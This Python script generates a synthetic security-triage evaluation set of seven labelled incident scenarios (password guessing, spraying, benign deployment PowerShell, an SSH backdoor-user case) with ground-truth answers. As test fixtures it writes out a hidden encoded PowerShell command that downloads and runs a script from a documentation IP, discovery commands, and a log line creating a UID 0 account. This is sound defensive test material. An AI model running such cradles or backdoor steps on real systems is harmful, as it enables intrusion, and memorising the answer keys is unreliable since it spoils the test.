"""Write the evaluation set: data/eval/scenarios.json plus one event file per scenario.

Each scenario is a small synthetic incident with a known ground truth, chosen to test judgement,
not just detection: real attacks, benign activity that trips the rules (false positives), and
cases the data cannot settle. RFC 5737 documentation IPs only.

    python scripts/make_eval_set.py
"""

from __future__ import annotations

import base64
import json
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

OUT = Path(__file__).resolve().parent.parent / "data" / "eval"
PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"


def at(day: int, hh: int, mm: int, ss: int = 0) -> datetime:
    return datetime(2026, 4, day, hh, mm, ss, tzinfo=UTC)


def iso(t: datetime) -> str:
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")


class Events:
    def __init__(self, prefix: str) -> None:
        self.prefix = prefix
        self.rows: list[dict[str, Any]] = []

    def add(self, t: datetime, **fields: Any) -> None:
        self.rows.append(
            {"event_id": f"{self.prefix}-{len(self.rows) + 1:04d}", "timestamp": iso(t), **fields}
        )

    def auth(self, t, user, host, src_ip, outcome, method="ntlm"):
        self.add(
            t,
            event_type="auth",
            action="logon",
            user=user,
            host=host,
            src_ip=src_ip,
            outcome=outcome,
            auth_method=method,
        )

    def proc(self, t, user, host, name, cmd, parent):
        self.add(
            t,
            event_type="process",
            action="process_start",
            user=user,
            host=host,
            process_name=name,
            command_line=cmd,
            parent_process=parent,
        )

    def net(self, t, host, src_ip, dst_ip, port, user=None):
        fields = {
            "event_type": "network",
            "action": "allowed",
            "host": host,
            "src_ip": src_ip,
            "dst_ip": dst_ip,
            "dst_port": port,
            "protocol": "tcp",
        }
        if user:
            fields["user"] = user
        self.add(t, **fields)

    def sorted(self) -> list[dict[str, Any]]:
        return sorted(self.rows, key=lambda r: (r["timestamp"], r["event_id"]))


def encoded(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


def s1() -> list[dict[str, Any]]:
    """Guessed password, then a hidden PowerShell download from the IOC server."""
    e = Events("S1")
    for d in range(1, 4):  # normal history: maria logs on from her desk every morning
        e.auth(at(d, 8, 40), "maria", "WS-MARIA01", "10.30.1.21", "success", "kerberos")
    start = at(6, 2, 10)
    for i in range(8):
        e.auth(start + timedelta(seconds=30 * i), "maria", "VPN-GW01", "203.0.113.77", "failure")
    e.auth(start + timedelta(minutes=4, seconds=30), "maria", "VPN-GW01", "203.0.113.77", "success")
    t = start + timedelta(minutes=9)
    e.proc(
        t,
        "maria",
        "WS-MARIA01",
        "powershell.exe",
        f"powershell.exe -w hidden -enc {encoded('IEX (iwr http://203.0.113.80/s.ps1)')} ; "
        "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.80/s.ps1')",
        "explorer.exe",
    )
    e.net(t + timedelta(seconds=4), "WS-MARIA01", "10.30.1.21", "203.0.113.80", 443, "maria")
    e.proc(
        t + timedelta(minutes=1),
        "maria",
        "WS-MARIA01",
        "whoami.exe",
        "whoami /all",
        "powershell.exe",
    )
    e.proc(
        t + timedelta(minutes=1, seconds=20),
        "maria",
        "WS-MARIA01",
        "net.exe",
        'net group "Domain Admins" /domain',
        "powershell.exe",
    )
    return e.sorted()


def s2() -> list[dict[str, Any]]:
    """Tom mistypes his password at his own desk, then works normally."""
    e = Events("S2")
    for d in range(1, 6):
        e.auth(at(d, 8, 55), "tom", "WS-TOM02", "10.30.1.44", "success", "kerberos")
        e.proc(at(d, 8, 57), "tom", "WS-TOM02", "outlook.exe", '"OUTLOOK.EXE"', "explorer.exe")
    start = at(6, 9, 1)
    for i in range(3):
        e.auth(
            start + timedelta(seconds=15 * i),
            "tom",
            "WS-TOM02",
            "10.30.1.44",
            "failure",
            "kerberos",
        )
    e.auth(start + timedelta(seconds=70), "tom", "WS-TOM02", "10.30.1.44", "success", "kerberos")
    e.proc(
        start + timedelta(minutes=2),
        "tom",
        "WS-TOM02",
        "outlook.exe",
        '"OUTLOOK.EXE"',
        "explorer.exe",
    )
    e.proc(
        start + timedelta(minutes=3),
        "tom",
        "WS-TOM02",
        "ms-teams.exe",
        '"ms-teams.exe"',
        "explorer.exe",
    )
    e.net(
        start + timedelta(minutes=3, seconds=10), "WS-TOM02", "10.30.1.44", "10.30.0.25", 443, "tom"
    )
    return e.sorted()


def s3() -> list[dict[str, Any]]:
    """The software-deployment agent runs the same encoded PowerShell every night."""
    e = Events("S3")
    cmd = (
        f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand "
        f"{encoded('& C:/ProgramData/Deploy/Update-AppAgent.ps1 -Quiet')}"
    )
    for d in range(1, 7):
        e.proc(at(d, 2, 0, 5), "svc_deploy", "SRV-APP03", "powershell.exe", cmd, "ccmexec.exe")
        e.net(at(d, 2, 0, 9), "SRV-APP03", "10.30.2.13", "10.30.0.40", 445, "svc_deploy")
    return e.sorted()


def s4() -> list[dict[str, Any]]:
    """One external IP tries one password against many accounts; nothing succeeds."""
    e = Events("S4")
    users = ["anna", "ben", "chris", "dana", "eli", "fay", "gus", "hana"]
    for i, user in enumerate(users):
        e.auth(
            at(6, 3, 0, 0) + timedelta(seconds=25 * i), user, "VPN-GW01", "198.51.100.66", "failure"
        )
    for d in range(4, 7):  # these users' normal logons come from inside
        e.auth(at(d, 8, 30), "anna", "WS-ANNA01", "10.30.1.60", "success", "kerberos")
    return e.sorted()


def s5() -> list[dict[str, Any]]:
    """A lab machine connects once to a listed IOC; no endpoint or logon telemetry exists."""
    e = Events("S5")
    e.net(at(6, 14, 22), "WS-LAB07", "10.30.9.17", "203.0.113.80", 443)
    e.net(at(6, 14, 25), "WS-LAB07", "10.30.9.17", "10.30.0.53", 53)
    return e.sorted()


def s6() -> list[dict[str, Any]]:
    """Wazuh: SSH password guessing against 'deploy', a success, then a new local user."""
    rows: list[dict[str, Any]] = []
    agent = {"id": "004", "name": "web-02", "ip": "10.30.3.8"}

    def add(t: datetime, rule: dict[str, Any], data: dict[str, Any] | None, log: str) -> None:
        rows.append(
            {
                "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
                "id": f"{int(t.timestamp())}.{200001 + len(rows)}",
                "rule": rule,
                "agent": agent,
                "manager": {"name": "wazuh-manager"},
                "decoder": {"name": "sshd" if "sshd" in rule["groups"] else "useradd"},
                "location": "/var/log/auth.log",
                "full_log": log,
                **({"data": data} if data else {}),
            }
        )

    start = at(6, 23, 40)
    for i in range(7):
        add(
            start + timedelta(seconds=12 * i),
            {
                "level": 5,
                "id": "5760",
                "description": "sshd: authentication failed.",
                "groups": ["syslog", "sshd", "authentication_failed"],
                "mitre": {"id": ["T1110.001"]},
            },
            {"srcip": "192.0.2.150", "dstuser": "deploy"},
            f"Failed password for deploy from 192.0.2.150 port {40100 + i} ssh2",
        )
    add(
        start + timedelta(seconds=90),
        {
            "level": 10,
            "id": "5720",
            "description": "sshd: Multiple authentication failures.",
            "groups": ["syslog", "sshd", "authentication_failures"],
            "mitre": {"id": ["T1110"]},
        },
        {"srcip": "192.0.2.150", "dstuser": "deploy"},
        "",
    )
    add(
        start + timedelta(seconds=110),
        {
            "level": 3,
            "id": "5715",
            "description": "sshd: authentication success.",
            "groups": ["syslog", "sshd", "authentication_success"],
            "mitre": {"id": ["T1078"]},
        },
        {"srcip": "192.0.2.150", "dstuser": "deploy"},
        "Accepted password for deploy from 192.0.2.150 port 40180 ssh2",
    )
    add(
        start + timedelta(minutes=4),
        {
            "level": 8,
            "id": "5902",
            "description": "New user added to the system.",
            "groups": ["syslog", "adduser"],
            "mitre": {"id": ["T1136.001"]},
        },
        {"dstuser": "sysupd"},
        "useradd[3302]: new user: name=sysupd, UID=0, GID=0",
    )
    return rows


def s7() -> list[dict[str, Any]]:
    """Lena fails four times from an unfamiliar external IP, then gets in; nothing follows."""
    e = Events("S7")
    for d in range(2, 6):
        e.auth(at(d, 9, 5), "lena", "VPN-GW01", "198.51.100.20", "success")
    start = at(6, 19, 30)
    for i in range(4):
        e.auth(start + timedelta(seconds=40 * i), "lena", "VPN-GW01", "192.0.2.44", "failure")
    e.auth(start + timedelta(minutes=3), "lena", "VPN-GW01", "192.0.2.44", "success")
    return e.sorted()


SCENARIOS = [
    {
        "id": "s1_stolen_password_payload",
        "title": "Guessed VPN password, then hidden PowerShell download",
        "truth": "malicious",
        "story": "maria's password was guessed from 203.0.113.77; minutes later her workstation "
        "ran hidden, encoded PowerShell that pulled a script from the IOC server and ran "
        "discovery commands.",
        "build": s1,
        "adapter": "generic",
        "expected_alerts": {
            "auth.failures_then_success": 1,
            "auth.repeated_failures": 1,
            "process.suspicious_powershell": 1,
            "network.local_ioc_match": 1,
        },
        "investigate": "auth.failures_then_success",
    },
    {
        "id": "s2_mistyped_password",
        "title": "Three mistyped passwords at the user's own desk",
        "truth": "benign",
        "story": "tom mistyped his password three times on his own workstation at his usual "
        "time and IP, then read mail and opened Teams as on every other day.",
        "build": s2,
        "adapter": "generic",
        "expected_alerts": {"auth.failures_then_success": 1},
        "investigate": "auth.failures_then_success",
    },
    {
        "id": "s3_deployment_powershell",
        "title": "Nightly software-deployment PowerShell",
        "truth": "benign",
        "story": "The deployment agent (ccmexec.exe) runs the same encoded update script as "
        "svc_deploy every night at 02:00 and reaches only the internal package share.",
        "build": s3,
        "adapter": "generic",
        "expected_alerts": {"process.suspicious_powershell": 6},
        "investigate": "process.suspicious_powershell",
    },
    {
        "id": "s4_password_spray",
        "title": "Password spray against eight accounts, no success",
        "truth": "malicious",
        "story": "198.51.100.66 tried one password against eight accounts within three minutes. "
        "No attempt succeeded: an attack, but no compromise.",
        "build": s4,
        "adapter": "generic",
        "expected_alerts": {"auth.password_spray": 1},
        "investigate": "auth.password_spray",
    },
    {
        "id": "s5_lone_ioc_hit",
        "title": "One connection to a listed IOC, no endpoint telemetry",
        "truth": "undetermined",
        "story": "A lab machine connected once to a listed IOC. There are no process or logon "
        "events for it, so what made the connection cannot be known from this data.",
        "build": s5,
        "adapter": "generic",
        "expected_alerts": {"network.local_ioc_match": 1},
        "investigate": "network.local_ioc_match",
    },
    {
        "id": "s6_wazuh_ssh_backdoor_user",
        "title": "Wazuh: SSH brute force, login, then a UID 0 user created",
        "truth": "malicious",
        "story": "192.0.2.150 guessed deploy's SSH password on web-02 and created a root-level "
        "account 'sysupd' four minutes later (Wazuh alerts).",
        "build": s6,
        "adapter": "wazuh",
        "expected_alerts": {
            "auth.failures_then_success": 1,
            "auth.repeated_failures": 1,
            "siem.high_severity_alert": 1,
        },
        "investigate": "auth.failures_then_success",
    },
    {
        "id": "s7_unfamiliar_ip_login",
        "title": "Failures then success from an unfamiliar external IP, nothing after",
        "truth": "undetermined",
        "story": "lena usually connects from 198.51.100.20; this evening she failed four times "
        "from 192.0.2.44 and then got in. Travel and a new home router fit as well as a "
        "stolen password; nothing after the login tells them apart.",
        "build": s7,
        "adapter": "generic",
        "expected_alerts": {"auth.failures_then_success": 1},
        "investigate": "auth.failures_then_success",
    },
]


def main() -> None:
    (OUT / "scenarios").mkdir(parents=True, exist_ok=True)
    manifest = []
    for spec in SCENARIOS:
        rows = spec["build"]()
        file = f"scenarios/{spec['id']}.jsonl"
        (OUT / file).write_text(
            "".join(json.dumps(r, sort_keys=True) + "\n" for r in rows), encoding="utf-8"
        )
        manifest.append({k: v for k, v in spec.items() if k != "build"} | {"file": file})
    (OUT / "scenarios.json").write_text(
        json.dumps({"version": 1, "scenarios": manifest}, indent=2) + "\n", encoding="utf-8"
    )
    print(f"wrote {len(manifest)} scenarios to {OUT}")


if __name__ == "__main__":
    main()
